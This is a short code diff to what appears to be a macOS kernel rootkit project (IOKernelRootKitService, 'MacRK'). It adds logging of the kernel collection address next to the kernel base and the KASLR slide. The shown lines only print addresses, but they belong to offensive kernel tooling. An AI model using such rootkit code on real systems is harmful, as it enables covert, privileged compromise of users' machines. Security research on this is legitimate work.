@@ -56,6 +56,10 @@ bool IOKernelRootKitService::start(IOService *provider)
 
 	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_base = %s\n", buffer);
 
+	snprintf(buffer, 128, "0x%llx", Kernel::findKernelCollection());
+
+	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_collection = %s\n", buffer);
+
 	snprintf(buffer, 128, "0x%llx", kernel_slide);
 
 	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_slide = %s\n", buffer);
